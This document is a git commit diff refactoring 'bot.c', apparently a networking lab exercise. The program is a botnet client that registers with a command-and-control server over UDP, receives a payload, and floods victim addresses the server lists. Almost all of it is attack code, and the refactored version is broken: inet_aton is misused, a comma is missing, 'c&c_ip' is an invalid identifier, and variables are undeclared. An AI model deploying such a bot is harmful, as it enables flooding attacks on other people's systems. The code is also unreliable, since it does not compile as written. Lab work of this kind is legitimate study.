27225002d52664e0dbed47626cd444a991f9496f
0036507126 <lg50712@fer.hr>
2020-03-25 17:19:15 +0100

    refactored bot.c

--- lab1/bot.c
+++ lab1/bot.c
@@ -9,206 +9,138 @@
 #include <netinet/in.h>
 #include <sys/time.h>
 #include <err.h>
+#include <arpa/inet.h>
 
-#define MESSAGE_MAXLEN 512
-#define PORTLEN 22
+#include "msg.h"
 
-// ip addresses and port numbers of victim processes
-struct pairs{
-	char ip[INET_ADDRSTRLEN];
-	char port[PORTLEN];
-};
+#define BUFLEN 512
 
-// packet structure which C&C server sends to bot processes
-struct msg{
-	char command;
-	struct pairs entries[20];
-	int number_of_pairs;
-};
-
-// usage
-void usage(){
-	fprintf(stderr, "Usage: ./bot server_ip server_port\n");
+void usage()
+{
+    fprintf(stderr, "Usage: ./bot server_ip server_port\n");
+    exit(1);
 }
 
-// function to parse the packet sent to the bot process by the C&C server
-void parse_packet(struct msg *message, char *packet, int bytes_recv){
-	int i = PORTLEN + INET_ADDRSTRLEN;
-	bytes_recv--; // decrementing by size of char command
-	int counter = bytes_recv / i;
+int udp_socket()
+{
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
 
-	message->command = *packet++;
+    if(sockfd < 0){
+        fprintf(stderr, "socket() error");
+        exit(2);
+    }
 
-	for(i = 0; i < counter; i++){
-		strcpy(message->entries[i].ip, packet);
-		packet += sizeof(message->entries[i].ip);
-		strcpy(message->entries[i].port, packet);
-		packet += sizeof(message->entries[i].port);
-	}
-
-	message->number_of_pairs = counter;
+    return sockfd;
 }
 
-/*
-	program the bot 
-	sends a "HELLO\n" packet to the UDP_server and then receives the payload from UDP_server
-*/
-void prog(struct msg *message, char *payload){
+void reg(int sockfd, char *ip_address, char *port)
+{   
+    char *data = "REG\n";
 
-	char *data = "HELLO\n";
+    struct sockaddr_in server = { 0 };
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = inet_aton(ip_address);
+    server.sin_port = htons(atoi(port));
 
-	// ip address and port number of the UDP_server
-	char *udp_server_ip = message->entries[0].ip;
-	char *udp_server_port = message->entries[0].port;
-	
-	printf("%s %s\n", udp_server_ip, udp_server_port);
+    sendto(sockfd, data, strlen(data), 0,  
+           (const struct sockaddr *) &server,
+           sizeof(server));
 
-	struct addrinfo *udp_server;
-	struct addrinfo hints;
-
-	memset(&hints, 0, sizeof(hints));
-	hints.ai_socktype = SOCK_DGRAM;
-
-	int sock;
-	sock = socket(PF_INET, SOCK_DGRAM, 0);
-
-	if(sock < 0){
-		err(2, "socket error\n");
-	}
-
-	int gai_error;
-
-	//getting info on the UDP_server
-	if((gai_error = getaddrinfo(udp_server_ip, udp_server_port, &hints, &udp_server)) != 0){
-		err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
-	}
-
-	//sends "HELLO\n"
-	int bytes_sent = sendto(sock, data, sizeof(data), 0, udp_server->ai_addr, udp_server->ai_addrlen);
-	
-	printf("sent package to the udp_serv\n");
-
-	//waits for the UDP_server to send the payload
-	int bytes_recv = recvfrom(sock, payload, sizeof(payload), 0, NULL, NULL);
-
-	printf("%s\n", payload);
 }
 
-/*
-	bot starts sending payload which it received from UDP_server
-	to victim processes with ip addresses and ports which it received from 
-	C&C server
-*/ 
-void run(struct msg *message, char *payload){
+void parse_packet(struct msg *message, char *packet, int bytes_recv)
+{
+    int i = PORT_LEN * ADDR_LEN + 1;
 
-	struct timeval tstart;
-	struct timeval tend;
+    int counter = bytes_recv/i;
 
-	int i;
+    message->command = *packet++;    
 
-	char *target_ip;
-	char *target_port;
+    for(i = 0; i < counter; i++){
+        
+        strcpy(message->entry[i].ip_address, packet);
+        packet += sizeof(message->entry[i].ip);
 
-	struct addrinfo *target;
-	struct addrinfo hints;
+        strcpy(message->entry[i].port_number, packet);
+        packet += sizeof(message->entry[i].port_number);
 
-	memset(&hints, 0, sizeof(hints));
-	hints.ai_socktype = SOCK_DGRAM;
+    }
 
-	int sock;
-	sock = socket(PF_INET, SOCK_DGRAM, 0);
-
-	if(sock < 0){
-		err(2, "socket error\n");
-	}
-
-	int gai_error;
-
-	// send payload for 15 seconds
-	gettimeofday(&tstart, NULL);
-	gettimeofday(&tend, NULL);
-
-	while(tend.tv_sec - tstart.tv_sec < 15){
-		for(i = 0; i < message->number_of_pairs; ++i){
-			target_ip = message->entries[i].ip;
-			target_port = message->entries[i].port;
-
-			if((gai_error = getaddrinfo(target_ip, target_port, &hints, &target)) != 0){
-				err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
-			}
-
-			int bytes_sent = sendto(sock, payload, sizeof(payload), 0, target->ai_addr, target->ai_addrlen);
-		}
-
-		gettimeofday(&tend, NULL);
-	}
+    message->number_of_pairs = counter;
 }
 
-int main(int argc, char **argv){
+void prog(int sockfd, struct msg *message, char *payload)
+{
+    char *data = "HELLO\n";
 
-	//the program requires 2 arguments
-	if (argc != 3){
-		usage();
-		return 1;
-	}
+    char *udp_server_ip = message->entry[0].ip_address;
+    char *udp_server_port = message->entry[0].port_number;
 
-	char *server_ip = argv[1];
-	char *server_port = argv[2];
+    struct sockaddr_in udp_server = { 0 };
+    udp_server.sin_family = AF_INET;
+    udp_server.sin_addr.s_addr = inet_aton(udp_server_ip);
+    udp_server.sin_port = htons(atoi(udp_server_port));
 
-	const char *data = "REG\n";
-	char packet[MESSAGE_MAXLEN];
-	char payload[512];
+    sendto(sockfd, data, strlen(data), 0
+           (const struct sockaddr *) &udp_server,
+           sizeof(udp_server));
 
-	struct msg message;
+    recvfrom(sockfd, payload, BUFLEN, 0, NULL, NULL); 
+}
 
-	struct addrinfo *server_address;
-	struct addrinfo hints;
+void run(int sockfd, struct msg *message, char *payload)
+{
+    char *target_ip;
+    char *target_port;
 
-	memset(&hints, 0, sizeof(hints));
-	hints.ai_socktype = SOCK_DGRAM;
+    struct sockaddr_in target;
+    
+    for(int i = 0; i < 15; ++i){
+        
+        for(int j = 0; j < message->number_of_pairs; ++j){
+            
+            memset(&target, 0, sizeof(target));
+            target.sin_family = AF_INET;
+            target.sin_addr.s_addr = inet_aton(message->entry[j].ip_address);
+            target.sin_port = htons(atoi(message->entry[j].port_number));
 
-	int gai_error;
+            sendto(sockfd, payload, strlen(payload), 0,
+                   (const struct sockaddr *) &target,
+                   sizeof(target));
+        }
+    } 
+}
 
-	int sock;
+int main(int argc, char **argv)
+{
+    if(argc != 3) usage();
 
-	sock = socket(PF_INET, SOCK_DGRAM, 0);
+    char payload[BUFLEN];
+    char packet[BUFLEN];
 
-	if(sock < 0){
-		fprintf(stderr, "socket error\n");
-		return 2;
-	}
+    char *c&c_ip = argv[1];
+    char *c&c_port = argv[2];
 
-	if((gai_error = getaddrinfo(server_ip, server_port, &hints, &server_address)) != 0){
-		fprintf(stderr, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
-		return 3;
-	}
+    int sockfd = udp_socket();
+    
+    reg(sockfd, c&c_ip, c&c_port);
+   
+    while(1){
 
-	//send "REG\n" to C&C server
-	int bytes_sent = sendto(sock, data, sizeof(data), 0, server_address->ai_addr, server_address->ai_addrlen);
+        int bytes_recv = recvfrom(sock, packet, BUFLEN,
+                                  0, NULL, NULL);
+        
+        parse_packet(&message, packet, bytes_recv);
+        
+        if(message.command == '0') 
+            prog(sockfd, &message, payload);
+        
+        else if(message.command == '1')
+            run(sockfd, &message, payload);
 
-	//receive instructions from C&C server
-	int bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
+    } 
 
-	parse_packet(&message, packet, bytes_recv);
+    close(sockfd);
 
-	if(message.command == '0'){
-		prog(&message, payload);
-	}
-
-	/* wait for the C&C server to send RUN command
-	 * and ip addresses and ports of the victim processes
-	 * to which the payload is going to be sent
-	*/
-
-	bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
-
-	parse_packet(&message, packet, bytes_recv);
-
-	if(message.command == '1'){
-		run(&message, payload);
-	}
-
-
-	freeaddrinfo(server_address);
-	return 0;
+    return 0;
 }
